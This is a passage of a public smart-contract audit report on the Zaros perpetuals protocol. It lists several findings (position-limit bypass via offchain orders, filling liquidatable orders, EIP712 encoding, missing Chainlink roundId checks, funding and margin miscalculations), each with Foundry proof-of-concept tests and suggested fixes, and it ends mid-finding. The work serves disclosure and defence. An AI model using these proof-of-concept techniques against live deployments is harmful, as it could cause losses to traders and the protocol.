During market order creation (`OrderBranch.createMarketOrder()`), the `tradingAccount.validatePositionsLimit()` function verifies that the account is below the maximum number of open positions. However, this check occurs only during order creation and not during settlement. Consequently, the maximum number of active positions can be exceeded if offchain orders are used.

This issue did not arise in the previous audit because `OrderBranch.createMarketOrder()` was the sole entry point for order creation, allowing only one pending order at a time. However, with the addition of offchain orders, it is now possible to have one pending market order plus multiple offchain orders simultaneously, leading to the described issue.

Consider a simple scenario of a global configuration allowing a maximum of one open position. Alice initially has no open positions but creates two offchain orders for markets A and B. After the offchain keeper transactions, Alice has 2 active positions, exceeding the configured maximum of 1. See the POC for this scenario below (Apply the diffs to `test/integration/perpetuals/settlement-branch/fillOffchainOrders/fillOffchainOrders.t.sol` and run `forge build && forge test --match-test testMaxOrderPOC`).

```diff
diff --git a/test/integration/perpetuals/settlement-branch/fillOffchainOrders/fillOffchainOrders.t.sol b/test/integration/perpetuals/settlement-branch/fillOffchainOrders/fillOffchainOrders.t.sol
index 23362ab..e45cc98 100644
--- a/test/integration/perpetuals/settlement-branch/fillOffchainOrders/fillOffchainOrders.t.sol
+++ b/test/integration/perpetuals/settlement-branch/fillOffchainOrders/fillOffchainOrders.t.sol
@@ -951,6 +951,179 @@ contract FillOffchainOrders_Integration_Test is Base_Test {
         }
     }
 
+    struct MaxOrdersPoc_Context {
+        MarketConfig marketConfig1;
+        MarketConfig marketConfig2;
+        uint256 initialMarginRate;
+        uint256 marginValueUsd;
+        uint128 tradingAccountId;
+        int128 sizeDelta;
+        uint128 perpsEngineMarkPrice;
+        uint128 markPrice;
+        bytes32 salt;
+        bytes32 digest;
+        uint8 v;
+        bytes32 r;
+        bytes32 s;
+    }
+
+    function testMaxOrderPOC() external {
+        // START OF SETUP
+        // Configuration setup
+        changePrank({ msgSender: users.owner.account });
+        perpsEngine.configureSystemParameters({
+            maxPositionsPerAccount: 1, // Setup max open positions to one!
+            marketOrderMinLifetime: MARKET_ORDER_MIN_LIFETIME,
+            liquidationFeeUsdX18: LIQUIDATION_FEE_USD,
+            marginCollateralRecipient: feeRecipients.marginCollateralRecipient,
+            orderFeeRecipient: feeRecipients.orderFeeRecipient,
+            settlementFeeRecipient: feeRecipients.settlementFeeRecipient,
+            liquidationFeeRecipient: users.liquidationFeeRecipient.account,
+            maxVerificationDelay: MAX_VERIFICATION_DELAY
+        });
+
+        changePrank({ msgSender: users.naruto.account });
+        MaxOrdersPoc_Context memory ctx;
+        ctx.marketConfig1 = getFuzzMarketConfig(1);
+        ctx.marketConfig2 = getFuzzMarketConfig(2);
+        ctx.initialMarginRate = MAX_MARGIN_REQUIREMENTS / 2;
+        ctx.marginValueUsd = USDC_MIN_DEPOSIT_MARGIN * 3;
+
+        deal({ token: address(usdc), to: users.naruto.account, give: ctx.marginValueUsd });
+        ctx.tradingAccountId = createAccountAndDeposit(ctx.marginValueUsd, address(usdc));
+
+        // First Offchain order setup
+        ctx.sizeDelta = fuzzOrderSizeDelta(
+            FuzzOrderSizeDeltaParams({
+                tradingAccountId: ctx.tradingAccountId,
+                marketId: ctx.marketConfig1.marketId,
+                settlementConfigurationId: SettlementConfiguration.MARKET_ORDER_CONFIGURATION_ID,
+                initialMarginRate: ud60x18(ctx.initialMarginRate),
+                marginValueUsd: ud60x18(ctx.marginValueUsd),
+                maxSkew: ud60x18(ctx.marketConfig1.maxSkew),
+                minTradeSize: ud60x18(ctx.marketConfig1.minTradeSize),
+                price: ud60x18(ctx.marketConfig1.mockUsdPrice),
+                isLong: true,
+                shouldDiscountFees: true
+            })
+        );
+
+        ctx.markPrice = perpsEngine.getMarkPrice(
+            ctx.marketConfig1.marketId, ctx.marketConfig1.mockUsdPrice, ctx.sizeDelta
+        ).intoUint128();
+
+        ctx.salt = bytes32(block.prevrandao);
+
+        ctx.digest = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                perpsEngine.DOMAIN_SEPARATOR(),
+                keccak256(
+                    abi.encode(
+                        Constants.CREATE_OFFCHAIN_ORDER_TYPEHASH,
+                        ctx.tradingAccountId,
+                        ctx.marketConfig1.marketId,
+                        ctx.sizeDelta,
+                        ctx.markPrice,
+                        false,
+                        uint120(0),
+                        ctx.salt
+                    )
+                )
+            )
+        );
+
+        (ctx.v, ctx.r, ctx.s) = vm.sign({ privateKey: users.naruto.privateKey, digest: ctx.digest });
+
+        OffchainOrder.Data[] memory offchainOrdersMarketOne = new OffchainOrder.Data[](1);
+        offchainOrdersMarketOne[0] = OffchainOrder.Data({
+            tradingAccountId: ctx.tradingAccountId,
+            marketId: ctx.marketConfig1.marketId,
+            sizeDelta: ctx.sizeDelta,
+            targetPrice: ctx.markPrice,
+            shouldIncreaseNonce: false,
+            nonce: 0,
+            salt: ctx.salt,
+            v: ctx.v,
+            r: ctx.r,
+            s: ctx.s
+        });
+
+        // Second offchain order setup
+        ctx.sizeDelta = fuzzOrderSizeDelta(
+            FuzzOrderSizeDeltaParams({
+                tradingAccountId: ctx.tradingAccountId,
+                marketId: ctx.marketConfig2.marketId,
+                settlementConfigurationId: SettlementConfiguration.MARKET_ORDER_CONFIGURATION_ID,
+                initialMarginRate: ud60x18(ctx.initialMarginRate),
+                marginValueUsd: ud60x18(ctx.marginValueUsd),
+                maxSkew: ud60x18(ctx.marketConfig2.maxSkew),
+                minTradeSize: ud60x18(ctx.marketConfig2.minTradeSize),
+                price: ud60x18(ctx.marketConfig2.mockUsdPrice),
+                isLong: true,
+                shouldDiscountFees: true
+            })
+        );
+
+        ctx.markPrice = perpsEngine.getMarkPrice(
+            ctx.marketConfig2.marketId, ctx.marketConfig2.mockUsdPrice, ctx.sizeDelta
+        ).intoUint128();
+
+        ctx.salt = bytes32(block.prevrandao);
+
+        ctx.digest = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                perpsEngine.DOMAIN_SEPARATOR(),
+                keccak256(
+                    abi.encode(
+                        Constants.CREATE_OFFCHAIN_ORDER_TYPEHASH,
+                        ctx.tradingAccountId,
+                        ctx.marketConfig2.marketId,
+                        ctx.sizeDelta,
+                        ctx.markPrice,
+                        false,
+                        uint120(0),
+                        ctx.salt
+                    )
+                )
+            )
+        );
+
+        (ctx.v, ctx.r, ctx.s) = vm.sign({ privateKey: users.naruto.privateKey, digest: ctx.digest });
+
+        OffchainOrder.Data[] memory offchainOrdersMarketTwo = new OffchainOrder.Data[](1);
+        offchainOrdersMarketTwo[0] = OffchainOrder.Data({
+            tradingAccountId: ctx.tradingAccountId,
+            marketId: ctx.marketConfig2.marketId,
+            sizeDelta: ctx.sizeDelta,
+            targetPrice: ctx.markPrice,
+            shouldIncreaseNonce: false,
+            nonce: 0,
+            salt: ctx.salt,
+            v: ctx.v,
+            r: ctx.r,
+            s: ctx.s
+        });
+        // END OF SETUP
+
+        changePrank({ msgSender: OFFCHAIN_ORDERS_KEEPER_ADDRESS });
+
+        bytes memory mockSignedReportOne =
+            getMockedSignedReport(ctx.marketConfig1.streamId, ctx.marketConfig1.mockUsdPrice);
+
+        bytes memory mockSignedReportTwo =
+            getMockedSignedReport(ctx.marketConfig2.streamId, ctx.marketConfig2.mockUsdPrice);
+
+        // Keeper fills offchain orders for marketId 1 and 2.
+        perpsEngine.fillOffchainOrders(ctx.marketConfig1.marketId, offchainOrdersMarketOne, mockSignedReportOne);
+        perpsEngine.fillOffchainOrders(ctx.marketConfig2.marketId, offchainOrdersMarketTwo, mockSignedReportTwo);
+
+        // Assert that open positions is 2. Therefore above the max value of 1 earlier.
+        uint256 numberOpenPositions = TradingAccountHarness(address(perpsEngine)).workaround_getActiveMarketsIdsLength(ctx.tradingAccountId);
+        assertEq(numberOpenPositions, 2);
+    }
+
     modifier whenAllOffchainOrdersTargetPriceCanBeMatchedWithItsFillPrice() {
         _;
     }
```

## Impact
Trading accounts can exceed the maximum number of allowed open positions.

## Tools Used
Manual Review

## Recommendation
Consider implementing a check during order settlement to ensure that the trading account remains below the maximum number of open positions.

## <a id='L-11'></a>L-11. Settlement fills liquidatable Market Orders

_Submitted by [tigerfrake](https://profiles.cyfrin.io/u/tigerfrake), [Reentrants](https://codehawks.cyfrin.io/team/cly3oauyy000d26pej6o3uazr), [bigsam](https://profiles.cyfrin.io/u/bigsam), [AllTooWell](https://codehawks.cyfrin.io/team/clvmefpm30001oev62qxtl4zt), [fyamf](https://profiles.cyfrin.io/u/fyamf), [s3v3ru5](https://profiles.cyfrin.io/u/s3v3ru5), [Oblivionis](https://profiles.cyfrin.io/u/Oblivionis), [BoRonGod](https://profiles.cyfrin.io/u/BoRonGod). Selected submission by: [Reentrants](https://codehawks.cyfrin.io/team/cly3oauyy000d26pej6o3uazr)._      
            


## Summary

The settlement process lacks a critical check to ensure that the position being filled is not liquidatable. Although the "isLiquidatable" check may pass during order creation, sudden price movements and the asynchronous nature of order fulfillment via keepers can lead to a scenario where the order becomes liquidatable by the time it is filled. This means the filled position can immediately become liquidatable, causing an instant loss to the user.

## Vulnerability Details

During order creation, the order is simulated using the `simulateTrade` function, which ensures the simulated trade is not liquidatable, as shown below:

<https://github.com/Cyfrin/2024-07-zaros/blob/69ccf428b745058bea08804b3f3d961d31406ba8/src/perpetuals/branches/OrderBranch.sol#L133-L134>

```Solidity
            if (TradingAccount.isLiquidatable(ctx.previousRequiredMaintenanceMarginUsdX18, marginBalanceUsdX18)) {
                revert Errors.AccountIsLiquidatable(tradingAccountId);
            }
```

This check ensures that once the trade is filled upon settlement, it is not immediately liquidatable, preventing instant loss to the user.

However, this validation is missing during the settlement process. Due to the asynchronous nature of settlement triggered by keepers, the settlement price might deviate, especially during volatile market conditions. This increases the likelihood that an order, that was not liquidatable at creation, becomes liquidatable at settlement.

The market order keeper function that fills a market order is shown below:

<https://github.com/Cyfrin/2024-07-zaros/blob/69ccf428b745058bea08804b3f3d961d31406ba8/src/external/chainlink/keepers/market-order/MarketOrderKeeper.sol#L169>

```Solidity
    function performUpkeep(bytes calldata performData) external onlyForwarder {
        (bytes memory signedReport, bytes memory extraData) = abi.decode(performData, (bytes, bytes));
        uint128 tradingAccountId = abi.decode(extraData, (uint128));

        MarketOrderKeeperStorage storage self = _getMarketOrderKeeperStorage();
        (IPerpsEngine perpsEngine, uint128 marketId) = (self.perpsEngine, self.marketId);

@>        perpsEngine.fillMarketOrder(tradingAccountId, marketId, signedReport);
    }
```

There are no checks here to verify whether the position being filled is liquidatable. The `fillMarketOrder` function, triggered by this process, also **does not** check whether the filled position will result in the user being liquidatable.

## Proof Of Concept

Add the following code to `liquidateAccounts.t.sol`&#x20;

```Solidity
import { OrderBranch } from "@zaros/perpetuals/branches/OrderBranch.sol";
function testGivenMarketOrderIsCreated_whenFillingOrder_shouldNotAcceptOrderIfItsLiquitadable() public { 
        // pre conditions - 
        // 1. create an account and deposit margin.
        // 2. create a market order and let it on pending state.
        uint256 marginValueUsdc = 100_000e6;
        int128 userPositionSizeDelta = 10e18;
        deal({ token: address(usdc), to: users.naruto.account, give: marginValueUsdc });
        changePrank({ msgSender: users.naruto.account });
        uint128 tradingAccountId = createAccountAndDeposit(marginValueUsdc, address(usdc));
        bytes memory mockSignedReport = _creteMarketOrder(
            BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, userPositionSizeDelta
        );

        // price movement - Asset price drops suddenly and position becomes liquidatable.
        updateMockPriceFeed(BTC_USD_MARKET_ID, MOCK_BTC_USD_PRICE/2);

        // action - fill the market order.
        // this should revert as the position is now liquidatable, but it will include the order in the active market orders.
        address marketOrderKeeper = marketOrderKeepers[BTC_USD_MARKET_ID];
        changePrank({ msgSender: marketOrderKeeper });
        perpsEngine.fillMarketOrder(tradingAccountId, BTC_USD_MARKET_ID, mockSignedReport);

        //  emit a {LogLiquidateAccount} event, as account is liquidated.
            vm.expectEmit({
                checkTopic1: true,
                checkTopic2: true,
                checkTopic3: false,
                checkData: false,
                emitter: address(perpsEngine)
            });

            emit LiquidationBranch.LogLiquidateAccount({
                keeper: liquidationKeeper,
                tradingAccountId: tradingAccountId,
                amountOfOpenPositions: 0,
                requiredMaintenanceMarginUsd: 0,
                marginBalanceUsd: 0,
                liquidatedCollateralUsd: 0,
                liquidationFeeUsd: 0
            });

        // a bot instananeously liquidates the position.
        _liquidateOneAccount(tradingAccountId);
    }

    function _creteMarketOrder(
        uint128 marketId,
        bytes32 streamId,
        uint256 mockUsdPrice,
        uint128 tradingAccountId,
        int128 sizeDelta
        ) internal returns (bytes memory mockSignedReport) { 

        perpsEngine.createMarketOrder(
            OrderBranch.CreateMarketOrderParams({
                tradingAccountId: tradingAccountId,
                marketId: marketId,
                sizeDelta: sizeDelta
            })
        ); 

        mockSignedReport = getMockedSignedReport(streamId, mockUsdPrice);
    }

    function _liquidateOneAccount(uint128 tradingAccountId) internal { 
        changePrank({ msgSender: liquidationKeeper });
        skip(1 hours);

        uint128[] memory liquidableAccountIds = new uint128[](1);
        liquidableAccountIds[0] = tradingAccountId;
        perpsEngine.liquidateAccounts(liquidableAccountIds);
    }
```

run: `forge test --match-test testGivenMarketOrderIsCreated_whenFillingOrder_shouldNotAcceptOrderIfItsLiquitadable`

Output: 

```JavaScript
 Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.85ms (1.01ms CPU time)
```

The test shows the following:

1. Bob creates an account, deposits collateral, and places a market order.
2. The collateral price suddenly drops, making Bob's position liquidatable.
3. The keeper calls `fillMarketOrder`, and the order is successfully filled.
4. A bot immediately liquidates the position.
5. The call doesn't revert.

## Impact

**Loss of Funds:** Not verifying if a position is liquidatable before filling it will cause the user to incur an instant loss.

## Tools Used

Manual Review & Foundry

## Recommendations

Immediately after the order is filled at the end of the `_fillOrder` function and before the `emit` statement, you can perform the `isLiquidatable` check as shown below. This will cause the fill order to fail if the position is liquidatable.

<https://github.com/Cyfrin/2024-07-zaros/blob/69ccf428b745058bea08804b3f3d961d31406ba8/src/perpetuals/branches/SettlementBranch.sol#L505>&#x20;

```diff
+ {
+            // // get account's required maintenance margin & unrealized PNL
+        (, UD60x18 requiredMaintenanceMarginUsdX18, SD59x18 accountTotalUnrealizedPnlUsdX18) =
+                tradingAccount.getAccountMarginRequirementUsdAndUnrealizedPnlUsd(0, SD59x18_ZERO);
+
+        // use unrealized PNL to calculate & output account's margin balance
+        SD59x18 marginBalanceUsdX18 = tradingAccount.getMarginBalanceUsd(accountTotalUnrealizedPnlUsdX18);
+
+        // prevent liquidatable accounts from trading
+        if (TradingAccount.isLiquidatable(requiredMaintenanceMarginUsdX18, marginBalanceUsdX18)) {
+                revert Errors.AccountIsLiquidatable(tradingAccountId);
+            }
+ }
+
         emit LogFillOrder(
             msg.sender,
             tradingAccountId,
```

Run the PoC again: Result ✅

```JavaScript
Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 16.90ms (2.29ms CPU time)
[FAIL. Reason: AccountIsLiquidatable(1)]
```

## <a id='L-12'></a>L-12. Potential `EIP712` violation in multiple cases

_Submitted by [Panthers](https://codehawks.cyfrin.io/team/clyq3gq8c0001z8dg8uaaygxi), [tigerfrake](https://profiles.cyfrin.io/u/tigerfrake), [0xpep7](https://profiles.cyfrin.io/u/0xpep7), [h2134](https://profiles.cyfrin.io/u/h2134), [berring](https://profiles.cyfrin.io/u/berring), [AllTooWell](https://codehawks.cyfrin.io/team/clvmefpm30001oev62qxtl4zt), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [4rdiii](https://profiles.cyfrin.io/u/4rdiii), [heim](https://profiles.cyfrin.io/u/heim), [brene](https://profiles.cyfrin.io/u/brene), [0xleadwizard](https://profiles.cyfrin.io/u/0xleadwizard), [benrai](https://profiles.cyfrin.io/u/benrai). Selected submission by: [tigerfrake](https://profiles.cyfrin.io/u/tigerfrake)._      
            


## Summary

`CustomReferralConfiguration`  & `Refferal` contracts do not implement `EIP712` correctly.

## Vulnerability Details

According to [EIP712 Standard](https://eips.ethereum.org/EIPS/eip-712#definition-of-typed-structured-data-%F0%9D%95%8A):

> The dynamic values `bytes` and `string` are encoded as a `keccak256` hash of their contents.

However, in [`CustomReferralConfiguration:load()`](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/leaves/CustomReferralConfiguration.sol#L16), the hashing is done as follows:

```solidity
>>  string internal constant CUSTOM_REFERRAL_CONFIGURATION_DOMAIN = "fi.zaros.CustomReferralConfiguration";

>>  function load(string memory customReferralCode)
        internal
        pure
        returns (Data storage customReferralConfigurationTestnet)
    {
>>      bytes32 slot = keccak256(abi.encode(CUSTOM_REFERRAL_CONFIGURATION_DOMAIN, customReferralCode));

        assembly {
            customReferralConfigurationTestnet.slot := slot
        }
    }
```

As seen, both `CUSTOM_REFERRAL_CONFIGURATION_DOMAIN` and `customReferralCode` are `string` values. However, the hashing (`slot`) encodes these values directly and not the `keccak256` hash of their contents as required by the standard.

The same is in [`Referral:load()`](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/leaves/Referral.sol#L16):

```solidity
>>  string internal constant REFERRAL_DOMAIN = "fi.zaros.Referral";

    function load(address accountOwner) internal pure returns (Data storage referralTestnet) {
>>      bytes32 slot = keccak256(abi.encode(REFERRAL_DOMAIN, accountOwner));

        assembly {
            referralTestnet.slot := slot
        }
    }
```

Here also, `REFERRAL_DOMAIN` is a `string` but it is encoded as is.

## Impact

Non-compliance with `EIP712` can cause problems with integrators and potentially lead to denial of service.

## Tools Used

Manual Review

## Recommendations

Correct this as follows:

```diff
    // CustomReferralConfiguration:load()
-   bytes32 slot = keccak256(abi.encode(CUSTOM_REFERRAL_CONFIGURATION_DOMAIN, customReferralCode));
+   bytes32 slot = keccak256(abi.encode(keccak256(CUSTOM_REFERRAL_CONFIGURATION_DOMAIN), keccak256(customReferralCode)));

    // Referral:load()
-   bytes32 slot = keccak256(abi.encode(REFERRAL_DOMAIN, accountOwner));
+   bytes32 slot = keccak256(abi.encode(keccak256(REFERRAL_DOMAIN), accountOwner));
```

## <a id='L-13'></a>L-13. In `ChainlinkUtil::getPrice` function, skipping `roundId` check at all can be disastrous

_Submitted by [0xe4669da](https://profiles.cyfrin.io/u/0xe4669da), [OdeWeb3](https://codehawks.cyfrin.io/team/cluqfw65k000169faytyphjol). Selected submission by: [0xe4669da](https://profiles.cyfrin.io/u/0xe4669da)._      
            


## Summary

In `ChainlinkUtil::getPrice` function, the `roundId` is not checked or validated at all. Stale prices could result in mass liquidations and huge bad debts that could even challenge the going concern of the protocol.

## Vulnerability Details

Zaros protocol is solely relying on Chainlink for most of the critical functionalities of the protocol. This actually introduces the chances of single point of failure. For off-chain price feeds, Zaros is using Chainlink's aggregator only.

While getting the off-chain price of an asset using `ChainlinkUtil::getPrice` function, the `roundId` is not checked or validated at all. However, `updatedAt` is compared with the `priceFeedHeartbeatSeconds`, but this sole check is not enough. As we can see in [this report](https://solodit.xyz/issues/m-02-should-check-return-data-from-chainlink-aggregators-code4rena-yeti-finance-yeti-finance-contest-git) how important the validation of `roundId` is.

[This another report](https://solodit.xyz/issues/m-05-chainlinks-latestrounddata-might-return-stale-or-incorrect-results-code4rena-backd-backd-contest-git) is also suitable for our case because the protocol has used the `updatedAt` and some sort of `stalePriceDelay` in order to accept only the fresh prices and avoid any stale prices. The reason that this report is valid because `roundId` is not validated at all, that makes this logic vulnerable to disastrous exploits.

The Chainlink [docs](https://docs.chain.link/data-feeds/historical-data) also emphasize the validation of `roundId`. Using the `roundId` we can ensure the data freshness, sequential data integrity, stale data detection and round completion.

Among others, a devastating example and lesson as a result of Chainlink price oracle malfunction we have [TERRA LUNA](https://cointelegraph.com/news/defi-protocols-declare-losses-as-attackers-exploit-luna-price-feed-discrepancy). We have to implement as many controls as we can to avoid such mishaps.

Source: [ChainlinkUtil.sol#L59C1-L76C6](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/external/chainlink/ChainlinkUtil.sol#L59C1-L76C6)

```solidity
    ...
    try priceFeed.latestRoundData() returns (uint80, int256 answer, uint256, uint256 updatedAt, uint80) {
        // no roundId validation <= FOUND
@>      if (block.timestamp - updatedAt > priceFeedHeartbeatSeconds) {
            revert Errors.OraclePriceFeedHeartbeat(address(priceFeed));
        }
        
        IOffchainAggregator aggregator = IOffchainAggregator(priceFeed.aggregator());
        int192 minAnswer = aggregator.minAnswer();
        int192 maxAnswer = aggregator.maxAnswer();

        if (answer <= minAnswer || answer >= maxAnswer) {
            revert Errors.OraclePriceFeedOutOfRange(address(priceFeed));
        }

        price = ud60x18(answer.toUint256() * 10 ** (Constants.SYSTEM_DECIMALS - priceDecimals));
    } catch {
        revert Errors.InvalidOracleReturn();
    }
    ...
    
```

## Impact

As an impact of wrong price feeds, positions may be liquidated prematurely or fail to liquidate when they should and eventually resulting bad debts. Positions open on wrong collateral prices which may cost major financial losses to the protocol. Incorrect collateral valuation can cause under-collateralization.

## Tools Used

Manual review

## Recommendations

To mitigate the risk, `latestRoundData` function returns the `answeredInRound` value among other returned values. Although this value is depreacated as mentioned in the docs but still this can be used to validate the `roundId`. If Zaros don't want to validate the `roundId` using `answeredInRound` (deprecated) then atleast it must check the `startedAt` timestamp because each roundData has this prop. The implication should be like, `startedAt` should be greater than last `startedAt` this will ensure that price does not pertain to previous round and the price is fresh and udpated.

## <a id='L-14'></a>L-14. Funding is incorrectly updated while executing `LiquidationBranch.liquidateAccounts()` with multiple trading accounts and/or positions.

_Submitted by [benrai](https://profiles.cyfrin.io/u/benrai), [baz1ka](https://profiles.cyfrin.io/u/baz1ka), [0xlandlady](https://profiles.cyfrin.io/u/0xlandlady), [Oblivionis](https://profiles.cyfrin.io/u/Oblivionis). Selected submission by: [baz1ka](https://profiles.cyfrin.io/u/baz1ka)._      
            


## Relevant GitHub Links

<https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/branches/LiquidationBranch.sol#L188>

## Summary

`LiquidationBranch.liquidateAccounts()` can liquidate multiple accounts in one call. If account has more than 1 position, all these positions would be liquidated too. When liquidating an account asset price changes because it closes position. In that case when liquidating multiple trading accounts and/or positions mark price should be changed multiple times but it doesn't. It changes only for current position in loop, but doesn't count all other liquidated position sizes.

## Impact

Incorrect value of `markPrice` affects on calculation of funding rate. The more accounts are liquidated, the bigger difference between correct and actual markPrice and consequently funding rate would be. This would be also a problem when the first closed position has a large size and the last has a small size, in that case, funding rate would be calculated for the last position with a small size.

## Proof of Concept

If we take a look at [LiquidationBranch.liquidateAccounts()](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/branches/LiquidationBranch.sol#L104-L223) function we will see that it iterates through all liquidatable account ids and if an account is liquidatable it start closing all account positions.

```solidity
    for (uint256 j; j < ctx.activeMarketsIds.length; j++) {
        // load current active market id into working data
        ctx.marketId = ctx.activeMarketsIds[j].toUint128();

        // fetch storage slot for perp market
        PerpMarket.Data storage perpMarket = PerpMarket.load(ctx.marketId);

        // load position data for user being liquidated in this market
        Position.Data storage position = Position.load(ctx.tradingAccountId, ctx.marketId);

        // save open position size
        ctx.oldPositionSizeX18 = sd59x18(position.size);

        // save inverted sign of open position size to prepare for closing the position
        ctx.liquidationSizeX18 = -ctx.oldPositionSizeX18;

        // calculate price impact of open position being closed
@>      ctx.markPriceX18 = perpMarket.getMarkPrice(ctx.liquidationSizeX18, perpMarket.getIndexPrice());

        // get current funding rates
        ctx.fundingRateX18 = perpMarket.getCurrentFundingRate();
        ctx.fundingFeePerUnitX18 = perpMarket.getNextFundingFeePerUnit(ctx.fundingRateX18, ctx.markPriceX18);

        // update funding rates for this perpetual market
        perpMarket.updateFunding(ctx.fundingRateX18, ctx.fundingFeePerUnitX18);

        // reset the position
        position.clear();

        // update account's active markets; this calls EnumerableSet::remove which
        // is why we are iterating over a memory copy of the trader's active markets
        tradingAccount.updateActiveMarkets(ctx.marketId, ctx.oldPositionSizeX18, SD59x18_ZERO);

        // update perp market's open interest and skew; we don't enforce ipen
        // interest and skew caps during liquidations as:
        // 1) open interest and skew are both decreased by liquidations
        // 2) we don't want liquidation to be DoS'd in case somehow those cap
        //    checks would fail
        perpMarket.updateOpenInterest(ctx.newOpenInterestX18, ctx.newSkewX18);
    }
```

As we see from in [this line](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/branches/LiquidationBranch.sol#L188) calculation of price impact is getting from closing current position (`ctx.liquidationSizeX18` which is `-ctx.oldPositionSizeX18`). But this does not include price impact of previous positions as index price is the same for all closed positions.

Let's take a simple example. Liquidatable accounts have 2 buy positions, first with size 20e18, other with 10e18. indexPrice is MOCK\_BTC\_USD\_PRICE = 100\_000e18. When liquidating this account position position with size 20e18 is liquidated first. After closing first position price would be 999\_999e17, but after closing second position price would be bigger - 999\_9995e16 (price after closing second position is bigger than after closing first).

Here is a simple test example with provided data that "simulates" mark price change while liquidating accounts:

```solidity
    function test_GetMarkPriceOfTwoPositions() external {
        uint256 marketId = BTC_USD_MARKET_ID;
        MarketConfig memory fuzzMarketConfig = getFuzzMarketConfig(marketId);
       
        // position delta = -position size
        int256 firstPositionDelta = -20e18;
        int256 secondPositionDelta = -10e18;

        UD60x18 markPriceAfterClosingFirstPosition = perpsEngine.getMarkPrice(fuzzMarketConfig.marketId, fuzzMarketConfig.mockUsdPrice, firstPositionDelta);

        console.log(markPriceAfterClosingFirstPosition.intoUint256()); // 99999900000000000000000

        UD60x18 markPriceAfterClosingSecondPosition = perpsEngine.getMarkPrice(fuzzMarketConfig.marketId, fuzzMarketConfig.mockUsdPrice, secondPositionDelta);

        console.log(markPriceAfterClosingSecondPosition.intoUint256()); // 99999950000000000000000
    }
```

## Recommended Mitigation Steps

It is necessary to take into account the sizeDelta of closed positions:

```diff
diff --git a/src/perpetuals/branches/LiquidationBranch.sol b/src/perpetuals/branches/LiquidationBranch.sol
index e2a4969..a3b3152 100644
--- a/src/perpetuals/branches/LiquidationBranch.sol
+++ b/src/perpetuals/branches/LiquidationBranch.sol
@@ -182,7 +182,7 @@ contract LiquidationBranch {
                 ctx.oldPositionSizeX18 = sd59x18(position.size);
 
                 // save inverted sign of open position size to prepare for closing the position
-                ctx.liquidationSizeX18 = -ctx.oldPositionSizeX18;
+                ctx.liquidationSizeX18 = ctx.liquidationSizeX18.sub(ctx.oldPositionSizeX18);
 
                 // calculate price impact of open position being closed
                 ctx.markPriceX18 = perpMarket.getMarkPrice(ctx.liquidationSizeX18, perpMarket.getIndexPrice());
```

## <a id='L-15'></a>L-15. Incorrect calculation of available margin

_Submitted by [kwakudr](https://profiles.cyfrin.io/u/kwakudr)._      
            


## Summary

The function is using the `initialMarginUsdX18` to calculate the available margin, when it should be using the `maintenanceMarginUsdX18`. This is incorrect.

## Vulnerability Details

```Solidity
function getAccountMarginBreakdown(uint128 tradingAccountId)
    external
    view
    returns (
        SD59x18 marginBalanceUsdX18,
        UD60x18 initialMarginUsdX18,
        UD60x18 maintenanceMarginUsdX18,
        SD59x18 availableMarginUsdX18
    )
{
    TradingAccount.Data storage tradingAccount = TradingAccount.loadExisting(tradingAccountId);
    SD59x18 activePositionsUnrealizedPnlUsdX18 = tradingAccount.getAccountUnrealizedPnlUsd();


    marginBalanceUsdX18 = tradingAccount.getMarginBalanceUsd(activePositionsUnrealizedPnlUsdX18);


    for (uint256 i; i < tradingAccount.activeMarketsIds.length(); i++) {
        uint128 marketId = tradingAccount.activeMarketsIds.at(i).toUint128();


        PerpMarket.Data storage perpMarket = PerpMarket.load(marketId);
        Position.Data storage position = Position.load(tradingAccountId, marketId);


        UD60x18 indexPrice = perpMarket.getIndexPrice();
        UD60x18 markPrice = perpMarket.getMarkPrice(unary(sd59x18(position.size)), indexPrice);


        UD60x18 notionalValueX18 = position.getNotionalValue(markPrice);
        (UD60x18 positionInitialMarginUsdX18, UD60x18 positionMaintenanceMarginUsdX18) = Position
            .getMarginRequirement(
            notionalValueX18,
            ud60x18(perpMarket.configuration.initialMarginRateX18),
            ud60x18(perpMarket.configuration.maintenanceMarginRateX18)
        );


        initialMarginUsdX18 = initialMarginUsdX18.add(positionInitialMarginUsdX18);
        maintenanceMarginUsdX18 = maintenanceMarginUsdX18.add(positionMaintenanceMarginUsdX18);
    }


    availableMarginUsdX18 = marginBalanceUsdX18.sub((initialMarginUsdX18).intoSD59x18());
}
```

```Solidity
    availableMarginUsdX18 = marginBalanceUsdX18.sub((initialMarginUsdX18).intoSD59x18());
```

The getAccountMarginBreakdown function is using the `initialMarginUsdX18` to calculate the available margin, when it should be using the `maintenanceMarginUsdX18`. This is incorrect because:

&#x20;

1. Available margin is typically calculated as the difference between the total margin balance and the maintenance margin, not the initial margin.
2. Using initial margin for this calculation can lead to an underestimation of the available margin, as initial margin requirements are generally higher than maintenance margin requirements.
3. This error could potentially prevent users from withdrawing funds that should be available to them, as it's using a more conservative (higher) margin requirement for the calculation.
4. The @dev comment mentions that "If the account's maintenance margin rate rises to 100% or above (MMR >= 1e18), the liquidation engine will be triggered." This is correct, but the available balance calculation doesn't align with this liquidation threshold, creating a disconnect between the user's perceived available funds and the actual risk of liquidation.

## Impact

Users might see less available margin than they should, potentially leading to unnecessary margin calls or preventing them from opening new positions when they actually have sufficient funds.

## Tools Used

Manual Review

## Recommendations

`availableMarginUsdX18 = marginBalanceUsdX18.sub((maintenanceMarginUsdX18).intoSD59x18());`

## <a id='L-16'></a>L-16. Use of uninitialized variable `lastFundingTime` leads to incorrect calcualtions

_Submitted by [tedox](https://profiles.cyfrin.io/u/tedox)._      
            


## Summary

